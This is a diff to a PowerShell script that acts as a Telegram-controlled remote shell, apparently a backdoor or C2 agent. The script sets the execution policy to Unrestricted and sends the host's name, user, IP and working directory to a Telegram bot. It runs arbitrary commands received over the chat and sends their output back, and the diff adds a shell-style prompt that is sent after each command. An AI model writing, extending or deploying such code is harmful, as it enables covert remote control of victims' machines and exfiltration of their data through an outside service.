@@ -171,14 +171,12 @@ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
 ## CONNECT WITH CHANNEL ##
 ##########################
 $whoami = Invoke-Expression whoami
-
 $ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
 $ipV4 = $ipV4.IPAddressToString
-
 $hostname = Invoke-Expression hostname
+$pwd = pwd
 
-
-$info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4
+$info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
 if($nopreview) { $preview_mode = "True" }
 if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}
 
@@ -247,8 +245,8 @@ While ($DoNotExit)  {
 	  "/select $ipV4 *"  { #Important: run with a space
 	    #The user wants to run a command
 		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
-		$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
-		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
+		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
 		
 		#Run the command
 		Try {
@@ -262,6 +260,9 @@ While ($DoNotExit)  {
 		
 		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
 		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+        $pwd = pwd
+        $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
+		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
 	  }
 	  "/stop $ipV4"  {
 		#The user wants to stop the script
